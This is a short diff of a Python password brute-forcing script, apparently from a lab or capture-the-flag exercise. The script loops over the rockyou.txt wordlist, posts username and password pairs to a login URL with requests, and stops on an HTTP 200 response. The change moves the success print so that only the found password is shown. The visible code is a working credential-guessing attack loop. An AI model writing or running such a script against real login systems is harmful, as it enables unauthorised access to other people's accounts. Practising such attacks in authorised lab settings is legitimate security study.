@@ -9,5 +9,6 @@ with open('/usr/share/wordlists/rockyou.txt') as file:
           user = {"username":u.strip(),"password":line.strip()}
           r =  requests.post(url,data = user)
           if r.status_code == 200:
+             print('[+]Password : '+line)
              break
-          print('[+]Password : '+line)
+          
